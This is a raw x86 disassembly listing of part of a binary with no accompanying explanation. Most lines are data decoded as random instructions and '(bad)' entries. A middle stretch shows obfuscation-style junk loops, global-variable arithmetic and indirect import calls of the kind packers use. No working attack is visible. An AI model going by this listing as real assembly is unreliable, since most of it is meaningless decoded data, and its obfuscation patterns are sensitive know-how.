  413576:	sahf   
  413577:	leave  
  413578:	add    al,al
  41357a:	jbe    0x4135c0
  41357c:	xchg   ebp,eax
  41357d:	bound  edi,QWORD PTR [eax-0x87a9b07]
  413583:	int3   
  413584:	mov    esp,edx
  413586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413587:	sbb    BYTE PTR [ecx+0x3c],cl
  41358a:	push   cs
  41358b:	mov    bh,0x53
  41358d:	mov    al,0x4a
  41358f:	dec    edi
  413590:	rol    BYTE PTR [edi+0x70],cl
  413593:	lods   al,BYTE PTR ds:[esi]
  413594:	push   ebx
  413595:	rcr    BYTE PTR [edx-0x175e5013],cl
  41359b:	and    BYTE PTR [esi+0x28f6c73d],0x58
  4135a2:	mov    dl,0xf1
  4135a4:	imul   edx,DWORD PTR [eax+0x12ed1451],0x7a6494b5
  4135ae:	cmp    ch,BYTE PTR [ecx]
  4135b0:	test   al,0x1c
  4135b2:	sub    al,0x94
  4135b4:	cwde   
  4135b5:	inc    esi
  4135b6:	sub    eax,0xd9c53061
  4135bb:	icebp  
  4135bc:	sbb    ch,dh
  4135be:	(bad)  
  4135bf:	sbb    al,0xa0
  4135c1:	stc    
  4135c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135c3:	push   ecx
  4135c4:	ds cmp al,0x4d
  4135c7:	cli    
  4135c8:	popa   
  4135c9:	mov    BYTE PTR [edx-0x1b],bl
  4135cc:	and    BYTE PTR [ebx-0x5f],cl
  4135cf:	(bad)  
  4135d1:	cmp    bh,BYTE PTR [esi+edx*2-0x4e50bb0e]
  4135d8:	scas   eax,DWORD PTR es:[edi]
  4135d9:	sar    DWORD PTR [edi+ebp*8+0x81f7ae0],0xec
  4135e1:	ret    
  4135e2:	fld    DWORD PTR [edi+0x5f0843f9]
  4135e8:	iret   
  4135e9:	jge    0x4135e9
  4135eb:	loop   0x4135c7
  4135ed:	adc    ch,BYTE PTR [edi-0x560dc0de]
  4135f3:	mov    edx,0xb29705ee
  4135f8:	bound  eax,QWORD PTR [edi+esi*4+0xe]
  4135fc:	mov    WORD PTR [esi-0x1c3dcf6e],?
  413602:	das    
  413603:	cmp    eax,0x12fd402d
  413608:	imul   ebp,DWORD PTR [ecx],0xd6964e82
  41360e:	dec    eax
  41360f:	mov    bh,0xf8
  413611:	retf   
  413612:	bound  ecx,QWORD PTR [ebp-0x2ace7f58]
  413618:	or     al,0x9d
  41361a:	mov    BYTE PTR [ecx-0x1e5362bb],bl
  413620:	mov    ch,0x10
  413622:	cmp    eax,0x3205f933
  413627:	adc    ah,dh
  413629:	jnp    0x41362b
  41362b:	mov    ebp,0x9abf2c33
  413630:	imul   BYTE PTR [ebx+esi*8]
  413633:	push   ds
  413634:	std    
  413635:	sub    BYTE PTR [edx+0x2466ff2b],al
  41363b:	xlat   BYTE PTR ds:[ebx]
  41363c:	inc    ebp
  41363d:	bound  ebx,QWORD PTR [ebx-0x26c68ed5]
  413643:	or     al,0xd9
  413645:	repz fidivr WORD PTR [ebp-0x4e]
  413649:	sub    bl,BYTE PTR [ebx+0x2f9b82fb]
  41364f:	js     0x413675
  413651:	lods   eax,DWORD PTR ds:[esi]
  413652:	xor    dl,ch
  413654:	ins    BYTE PTR es:[edi],dx
  413655:	xchg   ecx,eax
  413656:	aas    
  413657:	(bad)  
  413658:	icebp  
  413659:	outs   dx,BYTE PTR ds:[esi]
  41365a:	pop    ss
  41365b:	(bad)
  41365e:	cmc    
  41365f:	ja     0x41361c
  413661:	mov    BYTE PTR [edi+ebp*2-0x2abe8b96],dh
  413668:	popa   
  413669:	lods   eax,DWORD PTR ds:[esi]
  41366a:	push   esi
  41366b:	in     eax,0xb5
  41366d:	or     bl,al
  41366f:	jecxz  0x413632
  413671:	push   ds
  413672:	imul   ecx,ebx,0xfffffffa
  413675:	test   DWORD PTR [esi+0x6067dd13],ebp
  41367b:	adc    BYTE PTR [edx],dh
  41367d:	sub    BYTE PTR es:[esi],0x83
  413681:	mov    ecx,0x6dca6df2
  413686:	inc    ebp
  413687:	push   0x95137b1
  41368c:	fwait
  41368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41368e:	dec    edi
  41368f:	imul   esp,esp,0xa34b6f9f
  413695:	jmp    0xa91c:0xc895dabc
  41369c:	inc    edx
  41369d:	mov    ds:0x55e15776,eax
  4136a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136a3:	dec    eax
  4136a4:	jmp    0x730c:0x761d2e08
  4136ab:	push   0x1d
  4136ad:	lgs    ecx,FWORD PTR [esp+ecx*2]
  4136b1:	and    BYTE PTR cs:[ecx+0x74],cl
  4136b5:	jge    0x413671
  4136b7:	repz test DWORD PTR [ecx],esp
  4136ba:	(bad)  
  4136bb:	or     esp,DWORD PTR [edx+ebx*1+0x3c]
  4136bf:	adc    ebx,DWORD PTR [esi+0x6a]
  4136c2:	ficomp DWORD PTR [ecx-0x39]
  4136c5:	addr16 out 0x43,eax
  4136c8:	retf   0xc561
  4136cb:	mov    DWORD PTR [esi+eax*8],edi
  4136ce:	loopne 0x41371f
  4136d0:	std    
  4136d1:	inc    ebp
  4136d2:	pop    ds
  4136d3:	sbb    ebp,DWORD PTR [ecx]
  4136d5:	fisub  DWORD PTR [edi+0x701adc9f]
  4136db:	jg     0x413738
  4136dd:	xor    al,0xf2
  4136df:	mov    edx,0x4a01adc7
  4136e4:	out    0x26,al
  4136e6:	mov    edi,0x5f1dd292
  4136eb:	sub    dl,BYTE PTR [ecx-0x64052dd4]
  4136f1:	inc    esi
  4136f2:	js     0x413742
  4136f4:	jbe    0x413771
  4136f6:	cli    
  4136f7:	inc    ebp
  4136f8:	(bad)  
  4136f9:	xor    al,0xac
  4136fb:	sbb    eax,0x6ec0539c
  413700:	data16 xor bh,BYTE PTR [edx+0x79]
  413704:	dec    edi
  413705:	mov    ecx,0xbe2ee6cb
  41370a:	test   DWORD PTR [esi+0x54],ecx
  41370d:	xor    cl,BYTE PTR [ecx]
  41370f:	fist   WORD PTR [edi]
  413711:	addr16 dec esi
  413713:	jne    0x413744
  413715:	outs   dx,DWORD PTR ds:[esi]
  413716:	xchg   DWORD PTR [esi-0x6e],eax
  413719:	push   esi
  41371a:	xchg   esi,eax
  41371b:	cmp    al,0x47
  41371d:	mov    ebp,0x4fb921b0
  413722:	idiv   bl
  413724:	cdq    
  413725:	ins    BYTE PTR es:[edi],dx
  413726:	pop    edx
  413727:	in     eax,dx
  413728:	adc    edx,DWORD PTR [esi-0x3d]
  41372b:	add    eax,0xdf729c06
  413730:	(bad)  
  413731:	jl     0x4136be
  413733:	test   DWORD PTR [ecx-0x7fde18ea],edi
  413739:	out    0x6e,eax
  41373b:	das    
  41373c:	jnp    0x413797
  41373e:	push   cs
  41373f:	mov    WORD PTR [eax-0x44],fs
  413742:	or     BYTE PTR [bp+si],bl
  413745:	adc    edi,DWORD PTR [ecx]
  413747:	or     al,0xe3
  413749:	push   dx
  41374b:	clc    
  41374c:	and    DWORD PTR [eax+0x3335375e],edx
  413752:	or     esp,DWORD PTR ds:0x85831b22
  413758:	jmp    0x413717
  41375a:	sub    BYTE PTR [ecx],bl
  41375c:	scas   al,BYTE PTR es:[edi]
  41375d:	or     edi,DWORD PTR [ebx+0x27ada96c]
  413763:	adc    cl,BYTE PTR [ebp+0x52]
  413766:	push   cs
  413767:	mov    ebx,0x3d75ceeb
  41376c:	adc    ch,bh
  41376e:	jo     0x413798
  413770:	or     esp,DWORD PTR [edi+0x44]
  413773:	cmp    BYTE PTR [ebx],dh
  413775:	mov    ah,BYTE PTR [edi-0x1]
  413778:	push   es
  413779:	sbb    al,0x9c
  41377b:	lods   eax,DWORD PTR ds:[esi]
  41377c:	outs   dx,BYTE PTR ds:[esi]
  41377d:	fs dec eax
  41377f:	adc    BYTE PTR [ecx],ch
  413781:	pop    esi
  413782:	lock test DWORD PTR [eax],0x8ac05dd8
  413789:	adc    eax,0x430f9967
  41378e:	pop    esp
  41378f:	jno    0x413723
  413791:	mov    esi,edi
  413793:	(bad)  
  413794:	sahf   
  413795:	mov    esi,0x2689e5f6
  41379a:	(bad)  
  41379b:	and    ch,ah
  41379d:	setnp  BYTE PTR [esi-0x3dfdd15]
  4137a4:	push   ss
  4137a5:	fiadd  WORD PTR [eax]
  4137a7:	jbe    0x413730
  4137a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137aa:	pushf  
  4137ab:	mov    ebx,0x8e9885c4
  4137b0:	repz pop ds
  4137b2:	push   esi
  4137b3:	inc    ecx
  4137b4:	daa    
  4137b5:	(bad)  [ecx+0x45]
  4137b8:	adc    DWORD PTR [ebx],eax
  4137ba:	dec    ebp
  4137bb:	iret   
  4137bc:	loop   0x4137ac
  4137be:	test   BYTE PTR [ebp+edx*2+0x7d],dh
  4137c2:	clc    
  4137c3:	fsubr  QWORD PTR [esi-0x7]
  4137c6:	inc    DWORD PTR [esi-0x166b1902]
  4137cc:	punpcklwd mm7,DWORD PTR [ebx+eiz*8]
  4137d0:	xchg   ebp,eax
  4137d1:	mov    eax,0xf4cd771c
  4137d6:	cmp    DWORD PTR [ebx-0x1ffeb668],ecx
  4137dc:	push   ebp
  4137dd:	cmp    ah,dh
  4137df:	xchg   BYTE PTR ds:0x18f2338a,dh
  4137e5:	outs   dx,BYTE PTR ds:[esi]
  4137e6:	push   edi
  4137e7:	jg     0x41379c
  4137e9:	clc    
  4137ea:	repz adc DWORD PTR [esi],edx
  4137ed:	lods   al,BYTE PTR ds:[esi]
  4137ee:	add    dl,BYTE PTR [ebp-0x7b]
  4137f1:	xor    dl,BYTE PTR [esi-0x47]
  4137f4:	inc    esp
  4137f5:	push   edi
  4137f6:	and    edi,DWORD PTR [ecx-0x72]
  4137f9:	das    
  4137fa:	inc    ebp
  4137fb:	jbe    0x4137f6
  4137fd:	xchg   BYTE PTR [edx-0x1c],bl
  413800:	mov    ecx,0xa0996108
  413805:	or     BYTE PTR [ebx],al
  413807:	ins    DWORD PTR es:[edi],dx
  413808:	int3   
  413809:	sub    eax,0xf584cc59
  41380e:	repnz mov eax,ds:0xa4796755
  413814:	int    0xe4
  413816:	push   ebp
  413817:	mov    eax,ds:0x8baf355f
  41381c:	and    BYTE PTR [edi+0x634187bc],bh
  413822:	and    BYTE PTR [esi-0x74fbd57b],ah
  413828:	add    al,0x45
  41382a:	pop    ebp
  41382b:	ss pusha 
  41382d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41382e:	or     bl,BYTE PTR [esi+0x63]
  413831:	inc    ebx
  413832:	arpl   sp,sp
  413834:	cmc    
  413835:	lods   al,BYTE PTR ds:[esi]
  413836:	pushf  
  413837:	into   
  413838:	cs (bad) 
  41383a:	data16 mov al,cs:0x768115b5
  413841:	stos   BYTE PTR es:[edi],al
  413842:	int3   
  413843:	rcr    BYTE PTR [ecx+0x26939b74],0x37
  41384a:	aaa    
  41384b:	xor    dl,BYTE PTR [edi]
  41384d:	test   BYTE PTR [edx+0x75],al
  413850:	jge    0x41380c
  413852:	(bad)  
  413853:	(bad)  
  413855:	iret   
  413856:	std    
  413857:	fldenv [edx+0x6fc91812]
  41385d:	jns    0x413843
  41385f:	sti    
  413860:	add    DWORD PTR [ebp+0x54],ebx
  413863:	mov    ch,0xd6
  413865:	lahf   
  413866:	inc    ebx
  413867:	jb     0x4137f4
  413869:	fidiv  WORD PTR ds:0xe0ef92fe
  41386f:	aaa    
  413870:	xlat   BYTE PTR ds:[ebx]
  413871:	and    al,dl
  413873:	or     al,0x22
  413875:	sbb    al,0xff
  413877:	outs   dx,DWORD PTR ds:[esi]
  413878:	and    ah,BYTE PTR [ecx]
  41387a:	push   ebp
  41387b:	pusha  
  41387c:	jb     0x413839
  41387e:	push   ebp
  41387f:	push   0x6b985bc5
  413884:	and    ecx,DWORD PTR [ebp-0x8]
  413887:	sbb    BYTE PTR [ebx+0x5d13280e],al
  41388d:	enter  0x2f2e,0x55
  413891:	out    dx,al
  413892:	xchg   edx,eax
  413893:	cmp    bl,dl
  413895:	adc    al,0xa9
  413897:	mov    al,0x4f
  413899:	push   edx
  41389a:	or     BYTE PTR [esi+0x2d],ah
  41389d:	xor    ecx,ebp
  41389f:	jl     0x41385b
  4138a1:	jae    0x4138de
  4138a3:	gs clc 
  4138a5:	repnz add al,0xee
  4138a8:	call   0x8d38:0xed7cc779
  4138af:	mov    bl,0x51
  4138b1:	ds mov dh,0xb8
  4138b4:	sbb    DWORD PTR [edx+0x3a],ecx
  4138b7:	retf   
  4138b8:	repz inc edi
  4138ba:	sub    dl,0x5a
  4138bd:	(bad)  
  4138be:	fsub   DWORD PTR [esi-0x7b2863d8]
  4138c4:	xchg   esp,eax
  4138c5:	sbb    BYTE PTR [ebx+0x2f621959],ah
  4138cb:	xchg   esi,eax
  4138cc:	push   ss
  4138cd:	data16 adc bh,BYTE PTR [ebx+0x3a843607]
  4138d4:	xchg   esi,eax
  4138d5:	loop   0x4138d7
  4138d7:	retf   0xa62e
  4138da:	test   DWORD PTR [esi+0x67],ebx
  4138dd:	imul   eax,edi,0x24dd8695
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413cad
  413cce:	clc    
  413ccf:	cmp    al,0xae
  413cd1:	adc    al,0x8a
  413cd3:	jl     0x413d51
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	mov    ah,BYTE PTR [edi]
  413cdb:	ss hlt 
  413cdd:	loope  0x413d18
  413cdf:	sbb    eax,0xe0a579a5
  413ce4:	push   0xffffffb3
  413ce6:	sahf   
  413ce7:	(bad)  
  413ce8:	mov    esi,0x7cb9376
  413ced:	sub    bl,BYTE PTR [ecx+edx*8+0x58]
  413cf1:	out    dx,al
  413cf2:	and    al,BYTE PTR [eax+0x3bda3c6f]
  413cf8:	adc    ah,ah
  413cfa:	jne    0x413d20
  413cfc:	(bad)
  413d00:	mov    ebx,0x45a9e9cc
  413d05:	lock cmp ecx,DWORD PTR [ebx-0x6]
  413d09:	lods   al,BYTE PTR ds:[esi]
  413d0a:	stos   BYTE PTR es:[edi],al
  413d0b:	mov    bl,0x28
  413d0d:	outs   dx,BYTE PTR ds:[esi]
  413d0e:	xor    edi,ebp
  413d10:	jmp    0x1aa4:0xb704b831
  413d17:	test   BYTE PTR [ecx-0x6a1033e7],cl
  413d1d:	push   edi
  413d1e:	xor    eax,0x1786e135
  413d23:	mov    DWORD PTR [ecx],0x18542797
  413d29:	jb     0x413d2d
  413d2b:	sub    BYTE PTR [edx+eax*4-0x38ea5120],dl
  413d32:	inc    ebp
  413d33:	jge    0x413cbf
  413d35:	mov    eax,ds:0x973d3ccf
  413d3a:	jb     0x413d77
  413d3c:	xchg   DWORD PTR [ecx+edi*4],esi
  413d3f:	scas   al,BYTE PTR es:[edi]
  413d40:	sbb    al,0x9f
  413d42:	scas   al,BYTE PTR es:[edi]
  413d43:	sahf   
  413d44:	ins    DWORD PTR es:[edi],dx
  413d45:	sub    al,0xf9
  413d47:	mov    al,ds:0x59651c47
  413d4c:	mov    ebp,0x16486f3e
  413d51:	jnp    0x413ce2
  413d53:	retf   
  413d54:	hlt    
  413d55:	mov    DWORD PTR [edi+0x7a45c384],edi
  413d5b:	adc    cl,BYTE PTR [ecx-0xa63bf89]
  413d61:	push   0x36216ea7
  413d66:	call   0x1a3c2fea
  413d6b:	sub    eax,0xd20b1328
  413d70:	mov    DWORD PTR [ecx+0x5b8f193e],0x24fcbdbd
  413d7a:	mov    ebx,0xc94758dd
  413d7f:	loop   0x413d12
  413d81:	mov    cl,0xfd
  413d83:	and    DWORD PTR [eax-0x70],edi
  413d86:	cmp    ebp,DWORD PTR [eax+0x87d01be]
  413d8c:	cmp    BYTE PTR [esi-0x31cd5636],0xd9
  413d93:	add    edx,DWORD PTR [ebp+ebx*8-0x579d66a9]
  413d9a:	sbb    BYTE PTR [eax+0x59914bcc],al
  413da0:	(bad)  
  413da1:	fmul   st,st(1)
  413da3:	inc    esi
  413da4:	cmp    DWORD PTR [edx+ecx*1+0x59c17698],edi
  413dab:	sbb    esp,DWORD PTR [edi+0x4d81a6d6]
  413db1:	imul   ebp,DWORD PTR [edx+0x26],0xffffffbb
  413db5:	xchg   esp,eax
  413db6:	inc    eax
  413db7:	sub    eax,0x4b72cc1b
  413dbc:	mov    bl,0x97
  413dbe:	cli    
  413dbf:	popf   
  413dc0:	xlat   BYTE PTR ds:[ebx]
  413dc1:	adc    BYTE PTR [ebp-0x27],al
  413dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dc5:	inc    eax
  413dc6:	fadd   QWORD PTR [ecx-0x5335a957]
  413dcc:	fcom   QWORD PTR [ebx]
  413dce:	push   ss
  413dcf:	shr    ah,1
  413dd1:	loope  0x413d9d
  413dd3:	sbb    al,0x5a
  413dd5:	in     eax,0x9d
  413dd7:	pop    esp
  413dd8:	jmp    0x413da8
  413dda:	mov    ecx,DWORD PTR [edx+0x47]
  413ddd:	sub    DWORD PTR [edi+eiz*8+0x75],ecx
  413de1:	mov    dh,0xb
  413de3:	dec    ecx
  413de4:	pop    ss
  413de5:	sbb    BYTE PTR [eax],0xa7
  413de8:	adc    al,0xa8
  413dea:	lock mov eax,fs:0xa0ef3549
  413df1:	daa    
  413df2:	jp     0x413e3f
  413df4:	lods   eax,DWORD PTR ds:[esi]
  413df5:	push   ebx
  413df6:	popf   
  413df7:	mov    ch,al
  413df9:	add    edx,DWORD PTR [ebp+esi*8+0x2d26c158]
  413e00:	into   
  413e01:	cmp    DWORD PTR [ebx],0x76e9ff62
  413e07:	loopne 0x413e27
  413e09:	(bad)  
  413e0a:	jbe    0x413da7
  413e0c:	mov    eax,0xc73e2548
  413e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e12:	and    eax,0x56f673ed
  413e17:	(bad)  
  413e18:	cdq    
  413e19:	inc    edi
  413e1a:	sbb    dh,BYTE PTR [esi+0xbaed2f4]
  413e20:	into   
  413e21:	xchg   esi,eax
  413e22:	ins    DWORD PTR es:[edi],dx
  413e23:	lock mov ecx,0x27a48ffe
  413e29:	mov    ds,WORD PTR [edi-0x7966a988]
  413e2f:	dec    eax
  413e30:	xchg   ebx,eax
  413e31:	pop    ecx
  413e32:	dec    esi
  413e33:	mov    dl,ah
  413e35:	mov    al,ds:0xf3d862c3
  413e3a:	cmp    eax,DWORD PTR [esi+eiz*4]
  413e3d:	mov    ebp,0xbe8c5821
  413e42:	mov    dh,0xd4
  413e44:	scas   eax,DWORD PTR es:[edi]
  413e45:	push   ecx
  413e46:	mov    ah,0x10
  413e48:	(bad)  
  413e49:	or     WORD PTR [ebx+edi*8+0x396bd411],bp
  413e51:	inc    eax
  413e52:	call   0xcfd74782
  413e57:	add    esp,0xffffffba
  413e5a:	mov    esi,0xb39b7101
  413e5f:	aaa    
  413e60:	pop    cx
  413e62:	pop    ecx
  413e63:	stos   DWORD PTR es:[edi],eax
  413e64:	repnz sub esp,ecx
  413e67:	xor    eax,0xc9db7cf9
  413e6c:	mov    cl,0xda
  413e6e:	pop    eax
  413e6f:	cwde   
  413e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e71:	jno    0x413e62
  413e73:	dec    ebx
  413e74:	cmp    eax,0xdd60f34e
  413e79:	data16 jae 0x413edd
  413e7c:	inc    dx
  413e7e:	push   edi
  413e7f:	mov    dh,0xde
  413e81:	pushf  
  413e82:	mov    eax,es:0xe89bdd79
  413e88:	sbb    edi,DWORD PTR [ecx-0x36657811]
  413e8e:	sbb    DWORD PTR ds:0xf0573665,edx
  413e94:	paddsw mm6,QWORD PTR [esi-0x2d]
  413e98:	xor    DWORD PTR [eax+0x2d],ebp
  413e9b:	rol    BYTE PTR [ebx+0x39],0xae
  413e9f:	inc    ebx
  413ea0:	lods   eax,DWORD PTR ds:[esi]
  413ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ea2:	ins    DWORD PTR es:[edi],dx
  413ea3:	cld    
  413ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ea5:	jl     0x413e2c
